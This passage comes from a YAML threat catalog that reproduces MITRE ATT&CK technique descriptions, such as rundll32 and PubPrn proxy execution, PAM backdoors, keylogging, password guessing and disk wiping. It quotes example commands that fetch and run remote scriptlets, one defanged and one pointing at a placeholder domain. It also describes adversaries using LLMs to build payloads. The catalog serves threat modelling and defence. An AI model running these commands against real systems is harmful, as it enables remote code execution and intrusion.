      command can also be used to enumerate user accounts. Environment variables,
      such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to
      access this information.


      On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      commands such as `show users` and `show ssh` can be used to display users currently
      logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT
      TA18-106A Network Infrastructure Devices 2018)

      https://attack.mitre.org/techniques/T1033'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583
    ref_id: T1583
    name: Acquire Infrastructure
    description: 'Adversaries may buy, lease, rent, or obtain infrastructure that
      can be used during targeting. A wide variety of infrastructure exists for hosting
      and orchestrating adversary operations. Infrastructure solutions include physical
      or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease)
      Some infrastructure providers offer free trial periods, enabling infrastructure
      acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally,
      botnets are available for rent or purchase.


      Use of these infrastructure solutions allows adversaries to stage, launch, and
      execute operations. Solutions may help adversary operations blend in with traffic
      that is seen as normal, such as contacting third-party web services or acquiring
      infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090),
      including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation:
      FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022)
      Depending on the implementation, adversaries may use infrastructure that makes
      it difficult to physically tie back to them as well as utilize infrastructure
      that can be rapidly provisioned, modified, and shut down.

      https://attack.mitre.org/techniques/T1583'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.011
    ref_id: T1218.011
    name: Rundll32
    description: 'Adversaries may abuse rundll32.exe to proxy execution of malicious
      code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)),
      may avoid triggering security tools that may not monitor execution of the rundll32.exe
      process because of allowlists or false positives from normal operations. Rundll32.exe
      is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname,
      DLLfunction}</code>).


      Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002)
      Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code>
      and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes
      rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002)
      can be proxied through Rundll32.exe.


      Rundll32 can also be used to execute scripts such as JavaScript. This can be
      done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication
      ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This
      behavior has been seen used by malware such as Poweliks. (Citation: This is
      Security Command Line Confusion)


      Adversaries may also attempt to obscure malicious code from analysis by abusing
      the manner in which rundll32.exe loads DLL function names. As part of Windows
      compatibility support for various character sets, rundll32.exe will first check
      for wide/Unicode then ANSI character-supported functions before loading the
      specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll,
      ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>,
      or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>).
      Adversaries may therefore obscure malicious code by creating multiple identical
      exported function names and appending <code>W</code> and/or <code>A</code> to
      harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github
      NoRunDll) DLL functions can also be exported and executed by an ordinal number
      (ex: <code>rundll32.exe file.dll,#1</code>).


      Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036)
      techniques (such as changing DLL file names, file extensions, or function names)
      to further conceal execution of a malicious payload.(Citation: rundll32.exe
      defense evasion)

      https://attack.mitre.org/techniques/T1218/011'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1613
    ref_id: T1613
    name: Container and Resource Discovery
    description: "Adversaries may attempt to discover containers and other resources\
      \ that are available within a containers environment. Other resources may include\
      \ images, deployments, pods, nodes, and other information such as the status\
      \ of a cluster.\n\nThese resources can be viewed within web applications such\
      \ as the Kubernetes dashboard or can be queried via the Docker and Kubernetes\
      \ APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may\
      \ leak information about the environment, such as the environment\u2019s configuration,\
      \ which services are available, and what cloud provider the victim may be utilizing.\
      \ The discovery of these resources may inform an adversary\u2019s next steps\
      \ in the environment, such as how to perform lateral movement and which methods\
      \ to utilize for execution.\nhttps://attack.mitre.org/techniques/T1613"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.007
    ref_id: T1583.007
    name: Serverless
    description: 'Adversaries may purchase and configure serverless cloud infrastructure,
      such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that
      can be used during targeting. By utilizing serverless infrastructure, adversaries
      can make it more difficult to attribute infrastructure used during operations
      back to them.


      Once acquired, the serverless runtime environment can be leveraged to either
      respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090)
      traffic to an adversary-owned command and control server.(Citation: BlackWater
      Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps
      Script Abuse 2021) As traffic generated by these functions will appear to come
      from subdomains of common cloud providers, it may be difficult to distinguish
      from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation:
      Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare
      Workers)

      https://attack.mitre.org/techniques/T1583/007'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1132.001
    ref_id: T1132.001
    name: Standard Encoding
    description: 'Adversaries may encode data with a standard data encoding system
      to make the content of command and control traffic more difficult to detect.
      Command and control (C2) information can be encoded using a standard data encoding
      system that adheres to existing protocol specifications. Common data encoding
      schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia
      Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding
      systems may also result in data compression, such as gzip.

      https://attack.mitre.org/techniques/T1132/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.009
    ref_id: T1027.009
    name: Embedded Payloads
    description: "Adversaries may embed payloads within other files to conceal malicious\
      \ content from defenses. Otherwise seemingly benign files (such as scripts and\
      \ executables) may be abused to carry and obfuscate malicious payloads and content.\
      \ In some cases, embedded payloads may also enable adversaries to [Subvert Trust\
      \ Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution\
      \ controls such as digital signatures and notarization tickets.(Citation: Sentinel\
      \ Labs) \n\nAdversaries may embed payloads in various file formats to hide payloads.(Citation:\
      \ Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003),\
      \ though does not involve weaving malicious content into specific bytes and\
      \ patterns related to legitimate digital media formats.(Citation: GitHub PSImage)\
      \ \n\nFor example, adversaries have been observed embedding payloads within\
      \ or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2)\
      \ Adversaries have also been observed nesting payloads (such as executables\
      \ and run-only scripts) inside a file of the same format.(Citation: SentinelLabs\
      \ reversing run-only applescripts 2021) \n\nEmbedded content may also be used\
      \ as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads\
      \ used to infect benign system processes.(Citation: Trend Micro) These embedded\
      \ then injected payloads may be used as part of the modules of malware designed\
      \ to provide specific features such as encrypting C2 communications in support\
      \ of an orchestrator module. For example, an embedded module may be injected\
      \ into default browsers, allowing adversaries to then communicate via the network.(Citation:\
      \ Malware Analysis Report ComRAT)\nhttps://attack.mitre.org/techniques/T1027/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.003
    ref_id: T1556.003
    name: Pluggable Authentication Modules
    description: 'Adversaries may modify pluggable authentication modules (PAM) to
      access user credentials or enable otherwise unwarranted access to accounts.
      PAM is a modular system of configuration files, libraries, and executable files
      which guide authentication for many services. The most common authentication
      module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account
      authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation:
      Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)


      Adversaries may modify components of the PAM system to create backdoors. PAM
      components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary
      adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)


      Malicious modifications to the PAM system may also be abused to steal credentials.
      Adversaries may infect PAM resources with code to harvest user credentials,
      since the values exchanged with PAM components may be plain-text since PAM does
      not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)

      https://attack.mitre.org/techniques/T1556/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578.004
    ref_id: T1578.004
    name: Revert Cloud Instance
    description: 'An adversary may revert changes made to a cloud instance after they
      have performed malicious activities in attempt to evade detection and remove
      evidence of their presence. In highly virtualized environments, such as cloud-based
      infrastructure, this may be accomplished by restoring virtual machine (VM) or
      data storage snapshots through the cloud management dashboard or cloud APIs.


      Another variation of this technique is to utilize temporary storage attached
      to the compute instance. Most cloud providers provide various types of storage
      including persistent, local, and/or ephemeral, with the ephemeral types often
      reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation:
      Google - Restore Cloud Snapshot)

      https://attack.mitre.org/techniques/T1578/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592
    ref_id: T1592
    name: Gather Victim Host Information
    description: "Adversaries may gather information about the victim's hosts that\
      \ can be used during targeting. Information about hosts may include a variety\
      \ of details, including administrative data (ex: name, assigned IP, functionality,\
      \ etc.) as well as specifics regarding its configuration (ex: operating system,\
      \ language, etc.).\n\nAdversaries may gather this information in various ways,\
      \ such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595)\
      \ or [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
      \ Adversaries may also compromise sites then include malicious content designed\
      \ to collect host information from visitors.(Citation: ATT ScanBox) Information\
      \ about hosts may also be exposed to adversaries via online or other accessible\
      \ data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)\
      \ or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).\
      \ Gathering this information may reveal opportunities for other forms of reconnaissance\
      \ (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)\
      \ or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),\
      \ establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)\
      \ or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or\
      \ initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)\
      \ or [External Remote Services](https://attack.mitre.org/techniques/T1133)).\n\
      \nAdversaries may also gather victim host information via User-Agent HTTP headers,\
      \ which are sent to a server to identify the application, operating system,\
      \ vendor, and/or version of the requesting user agent. This can be used to inform\
      \ the adversary\u2019s follow-on action. For example, adversaries may check\
      \ user agents for the requesting operating system, then only serve malware for\
      \ target operating systems while ignoring others.(Citation: TrellixQakbot)\n\
      https://attack.mitre.org/techniques/T1592"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1596.003
    ref_id: T1596.003
    name: Digital Certificates
    description: 'Adversaries may search public digital certificate data for information
      about victims that can be used during targeting. Digital certificates are issued
      by a certificate authority (CA) in order to cryptographically verify the origin
      of signed content. These certificates, such as those used for encrypted web
      traffic (HTTPS SSL/TLS communications), contain information about the registered
      organization such as name and location.


      Adversaries may search digital certificate data to gather actionable information.
      Threat actors can use online resources and lookup tools to harvest information
      about certificates.(Citation: SSLShopper Lookup) Digital certificate data may
      also be available from artifacts signed by the organization (ex: certificates
      used from encrypted web traffic are served with content).(Citation: Medium SSL
      Cert) Information from these sources may reveal opportunities for other forms
      of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
      or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

      https://attack.mitre.org/techniques/T1596/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056.001
    ref_id: T1056.001
    name: Keylogging
    description: 'Adversaries may log user keystrokes to intercept credentials as
      the user types them. Keylogging is likely to be used to acquire credentials
      for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
      efforts are not effective, and may require an adversary to intercept keystrokes
      on a system for a substantial period of time before credentials can be successfully
      captured. In order to increase the likelihood of capturing credentials quickly,
      an adversary may also perform actions such as clearing browser cookies to force
      users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)


      Keylogging is the most prevalent type of input capture, with many different
      ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods
      include:


      * Hooking API callbacks used for processing keystrokes. Unlike [Credential API
      Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely
      on API functions intended for processing keystroke data.

      * Reading raw keystroke data from the hardware buffer.

      * Windows Registry modifications.

      * Custom drivers.

      * [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide
      adversaries with hooks into the operating system of network devices to read
      raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)

      https://attack.mitre.org/techniques/T1056/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.012
    ref_id: T1564.012
    name: File/Path Exclusions
    description: 'Adversaries may attempt to hide their file-based artifacts by writing
      them to specific folders or file names excluded from antivirus (AV) scanning
      and other defensive capabilities. AV and other file-based scanners often include
      exclusions to optimize performance as well as ease installation and legitimate
      use of applications. These exclusions may be contextual (e.g., scans are only
      initiated in response to specific triggering events/alerts), but are also often
      hardcoded strings referencing specific folders and/or files assumed to be trusted
      and legitimate.(Citation: Microsoft File Folder Exclusions)


      Adversaries may abuse these exclusions to hide their file-based artifacts. For
      example, rather than  tampering with tool settings to add a new exclusion (i.e.,
      [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries
      may drop their file-based payloads in default or otherwise well-known exclusions.
      Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)
      and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043)
      activities to both discover and verify existing exclusions in a victim environment.

      https://attack.mitre.org/techniques/T1564/012'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1222.002
    ref_id: T1222.002
    name: Linux and Mac File and Directory Permissions Modification
    description: "Adversaries may modify file or directory permissions/attributes\
      \ to evade access control lists (ACLs) and access protected files.(Citation:\
      \ Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018)\
      \ File and directory permissions are commonly managed by ACLs configured by\
      \ the file or directory owner, or users with the appropriate permissions. File\
      \ and directory ACL implementations vary by platform, but generally explicitly\
      \ designate which users or groups can perform which actions (read, write, execute,\
      \ etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission\
      \ groups (user, group, and other) and a standard set of permissions (read, write,\
      \ and execute) that are applied to each group. While nuances of each platform\u2019\
      s permissions implementation may vary, most of the platforms provide two primary\
      \ commands used to manipulate file and directory ACLs: <code>chown</code> (short\
      \ for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial\
      \ may use these commands to make themselves the owner of files and directories\
      \ or change the mode if current permissions allow it. They could subsequently\
      \ lock others out of the file. Specific file and directory modifications may\
      \ be a required step for many techniques, such as establishing Persistence via\
      \ [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004)\
      \ or tainting/hijacking other instrumental binary/configuration files via [Hijack\
      \ Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS\
      \ Common Tools and Techniques)\nhttps://attack.mitre.org/techniques/T1222/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110.001
    ref_id: T1110.001
    name: Password Guessing
    description: 'Adversaries with no prior knowledge of legitimate credentials within
      the system or environment may guess passwords to attempt access to accounts.
      Without knowledge of the password for an account, an adversary may opt to systematically
      guess the password using a repetitive or iterative mechanism. An adversary may
      guess login credentials without prior knowledge of system or environment passwords
      during an operation by using a list of common passwords. Password guessing may
      or may not take into account the target''s policies on password complexity or
      use policies that may lock accounts out after a number of failed attempts.


      Guessing passwords can be a risky option because it could cause numerous authentication
      failures and account lockouts, depending on the organization''s login failure
      policies. (Citation: Cylance Cleaver)


      Typically, management services over commonly used ports are used when guessing
      passwords. Commonly targeted services include the following:


      * SSH (22/TCP)

      * Telnet (23/TCP)

      * FTP (21/TCP)

      * NetBIOS / SMB / Samba (139/TCP & 445/TCP)

      * LDAP (389/TCP)

      * Kerberos (88/TCP)

      * RDP / Terminal Services (3389/TCP)

      * HTTP/HTTP Management Services (80/TCP & 443/TCP)

      * MSSQL (1433/TCP)

      * Oracle (1521/TCP)

      * MySQL (3306/TCP)

      * VNC (5900/TCP)

      * SNMP (161/UDP and 162/TCP/UDP)


      In addition to management services, adversaries may "target single sign-on (SSO)
      and cloud-based applications utilizing federated authentication protocols,"
      as well as externally facing email applications, such as Office 365.(Citation:
      US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces
      (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication
      protocols.(Citation: Trend Micro Emotet 2020)


      In default environments, LDAP and Kerberos connection attempts are less likely
      to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

      https://attack.mitre.org/techniques/T1110/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1216.001
    ref_id: T1216.001
    name: PubPrn
    description: 'Adversaries may use PubPrn to proxy execution of malicious remote
      files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005)
      script that publishes a printer to Active Directory Domain Services. The script
      may be signed by Microsoft and is commonly executed through the [Windows Command
      Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>.
      For example, the following code publishes a printer within the specified domain:
      <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation:
      pubprn)


      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote
      sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the
      second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted
      on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>.
      This behavior may bypass signature validation restrictions and application control
      solutions that do not account for abuse of this script.


      In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated
      to prevent proxying execution from a remote site. This is done by limiting the
      protocol specified in the second parameter to <code>LDAP://</code>, vice the
      <code>script:</code> moniker which could be used to reference remote code via
      HTTP(S).

      https://attack.mitre.org/techniques/T1216/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1597.002
    ref_id: T1597.002
    name: Purchase Technical Data
    description: "Adversaries may purchase technical information about victims that\
      \ can be used during targeting. Information about victims may be available for\
      \ purchase within reputable private sources and databases, such as paid subscriptions\
      \ to feeds of scan databases or other data aggregation services. Adversaries\
      \ may also purchase information from less-reputable sources such as dark web\
      \ or cybercrime blackmarkets.\n\nAdversaries may purchase information about\
      \ their already identified targets, or use purchased data to discover opportunities\
      \ for successful breaches. Threat actors may gather various technical details\
      \ from purchased data, including but not limited to employee contact information,\
      \ credentials, or specifics regarding a victim\u2019s infrastructure.(Citation:\
      \ ZDNET Selling Data) Information from these sources may reveal opportunities\
      \ for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
      \ or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),\
      \ establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)\
      \ or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or\
      \ initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)\
      \ or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).\nhttps://attack.mitre.org/techniques/T1597/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003
    ref_id: T1003
    name: OS Credential Dumping
    description: 'Adversaries may attempt to dump credentials to obtain account login
      and credential material, normally in the form of a hash or a clear text password.
      Credentials can be obtained from OS caches, memory, or structures.(Citation:
      Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008)
      and access restricted information.


      Several of the tools mentioned in associated sub-techniques may be used by both
      adversaries and professional security testers. Additional custom tools likely
      exist as well.

      https://attack.mitre.org/techniques/T1003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1129
    ref_id: T1129
    name: Shared Modules
    description: 'Adversaries may execute malicious payloads via loading shared modules.
      Shared modules are executable files that are loaded into processes to provide
      access to reusable code, such as specific custom functions or invoking OS API
      functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).


      Adversaries may use this functionality as a way to execute arbitrary payloads
      on a victim system. For example, adversaries can modularize functionality of
      their malware into shared objects that perform various functions such as managing
      C2 network communications or execution of specific actions on objective.


      The Linux & macOS module loader can load and execute shared objects from arbitrary
      local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen`
      and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib`
      files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation:
      RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)


      The Windows module loader can be instructed to load DLLs from arbitrary local
      paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality
      resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106)
      which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft
      DLL)

      https://attack.mitre.org/techniques/T1129'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1602
    ref_id: T1602
    name: Data from Configuration Repository
    description: 'Adversaries may collect data related to managed devices from configuration
      repositories. Configuration repositories are used by management systems in order
      to configure, manage, and control data on remote systems. Configuration repositories
      may also facilitate remote access and administration of devices.


      Adversaries may target these repositories in order to collect large quantities
      of sensitive system administration data. Data from configuration repositories
      may be exposed by various protocols and software and can store a wide variety
      of data, much of which may align with adversary Discovery objectives.(Citation:
      US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)

      https://attack.mitre.org/techniques/T1602'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1561.002
    ref_id: T1561.002
    name: Disk Structure Wipe
    description: "Adversaries may corrupt or wipe the disk data structures on a hard\
      \ drive necessary to boot a system; targeting specific critical systems or in\
      \ large numbers in a network to interrupt availability to system and network\
      \ resources. \n\nAdversaries may attempt to render the system unable to boot\
      \ by overwriting critical data located in structures such as the master boot\
      \ record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation:\
      \ FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation:\
      \ Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained\
      \ in disk structures may include the initial executable code for loading an\
      \ operating system or the location of the file system partitions on disk. If\
      \ this information is not present, the computer will not be able to load an\
      \ operating system during the boot process, leaving the computer unavailable.\
      \ [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be\
      \ performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001)\
      \ if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may\
      \ reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact\
      \ on the target organization, malware designed for destroying disk structures\
      \ may have worm-like features to propagate across a network by leveraging other\
      \ techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),\
      \ [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows\
      \ Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec\
      \ Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon\
      \ Nov 2016)(Citation: Kaspersky StoneDrill 2017)\nhttps://attack.mitre.org/techniques/T1561/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1498.001
    ref_id: T1498.001
    name: Direct Network Flood
    description: 'Adversaries may attempt to cause a denial of service (DoS) by directly
      sending a high-volume of network traffic to a target. This DoS attack may also
      reduce the availability and functionality of the targeted system(s) and network.
      [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when
      one or more systems are used to send a high-volume of network packets towards
      the targeted service''s network. Almost any network protocol may be used for
      flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful
      protocols such as TCP can be used as well.


      Botnets are commonly used to conduct network flooding attacks against networks
      and services. Large botnets can generate a significant amount of traffic from
      systems spread across the global Internet. Adversaries may have the resources
      to build out and control their own botnet infrastructure or may rent time on
      an existing botnet to conduct an attack. In some of the worst cases for distributed
      DoS (DDoS), so many systems are used to generate the flood that each one only
      needs to send out a small amount of traffic to produce enough volume to saturate
      the target network. In such circumstances, distinguishing DDoS traffic from
      legitimate clients becomes exceedingly difficult. Botnets have been used in
      some of the most high-profile DDoS flooding attacks, such as the 2012 series
      of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March
      2016)

      https://attack.mitre.org/techniques/T1498/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.007
    ref_id: T1574.007
    name: Path Interception by PATH Environment Variable
    description: "Adversaries may execute their own malicious payloads by hijacking\
      \ environment variables used to load libraries. The PATH environment variable\
      \ contains a list of directories (User and System) that the OS searches sequentially\
      \ through in search of the binary that was called from a script or the command\
      \ line. \n\nAdversaries can place a malicious program in an earlier entry in\
      \ the list of directories stored in the PATH environment variable, resulting\
      \ in the operating system executing the malicious binary rather than the legitimate\
      \ binary when it searches sequentially through that PATH listing.\n\nFor example,\
      \ on Windows if an adversary places a malicious program named \"net.exe\" in\
      \ `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe`\
      \ in the PATH environment variable, when \"net\" is executed from the command-line\
      \ the `C:\\example path` will be called instead of the system's legitimate executable\
      \ at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely\
      \ on the PATH environment variable to determine the locations that are searched\
      \ when the path for the program is not given, such as executing programs from\
      \ a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation:\
      \ ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify\
      \ the $PATH variable specifying the directories to be searched.  An adversary\
      \ can modify the `$PATH` variable to point to a directory they have write access.\
      \ When a program using the $PATH variable is called, the OS searches the specified\
      \ directory and executes the malicious binary. On macOS, this can also be performed\
      \ through modifying the $HOME variable. These variables can be modified using\
      \ the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004),\
      \ or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC\
      \ linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic\
      \ Rules macOS launchctl 2022)\nhttps://attack.mitre.org/techniques/T1574/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.002
    ref_id: T1213.002
    name: Sharepoint
    description: 'Adversaries may leverage the SharePoint repository as a source to
      mine valuable information. SharePoint will often contain useful information
      for an adversary to learn about the structure and functionality of the internal
      network and systems. For example, the following is a list of example information
      that may hold potential value to an adversary and may also be found on SharePoint:


      * Policies, procedures, and standards

      * Physical / logical network diagrams

      * System architecture diagrams

      * Technical system documentation

      * Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))

      * Work / project schedules

      * Source code snippets

      * Links to network shares and other internal resources

      https://attack.mitre.org/techniques/T1213/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1006
    ref_id: T1006
    name: Direct Volume Access
    description: 'Adversaries may directly access a volume to bypass file access controls
      and file system monitoring. Windows allows programs to have direct access to
      logical volumes. Programs with direct access may read and write files directly
      from the drive by analyzing file system data structures. This technique may
      bypass Windows file access controls as well as file system monitoring tools.
      (Citation: Hakobyan 2009)


      Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation:
      Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party
      utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404))
      to create shadow copies or backups of data from system volumes.(Citation: LOLBAS
      Esentutl)

      https://attack.mitre.org/techniques/T1006'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.007
    ref_id: T1588.007
    name: Artificial Intelligence
    description: 'Adversaries may obtain access to generative artificial intelligence
      tools, such as large language models (LLMs), to aid various techniques during
      targeting. These tools may be used to inform, bolster, and enable a variety
      of malicious tasks including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043),
      creating basic scripts, assisting social engineering, and even developing payloads.(Citation:
      MSFT-AI)


      For example, by utilizing a publicly available LLM an adversary is essentially
      outsourcing or automating certain tasks to the tool. Using AI, the adversary
      may draft and generate content in a variety of written languages to be used
      in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598)
      campaigns. The same publicly available tool may further enable vulnerability
      or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587).
      AI tools may also automate technical tasks by generating, refining, or otherwise
      enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027))
      malicious scripts and payloads.(Citation: OpenAI-CTI)

      https://attack.mitre.org/techniques/T1588/007'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1666
    ref_id: T1666
    name: Modify Cloud Resource Hierarchy
    description: "Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service\
      \ (IaaS) environments in order to evade defenses.  \n\nIaaS environments often\
      \ group resources into a hierarchy, enabling improved resource management and\
      \ application of policies to relevant groups. Hierarchical structures differ\
      \ among cloud providers. For example, in AWS environments, multiple accounts\
      \ can be grouped under a single organization, while in Azure environments, multiple\
      \ subscriptions can be grouped under a single management group.(Citation: AWS\
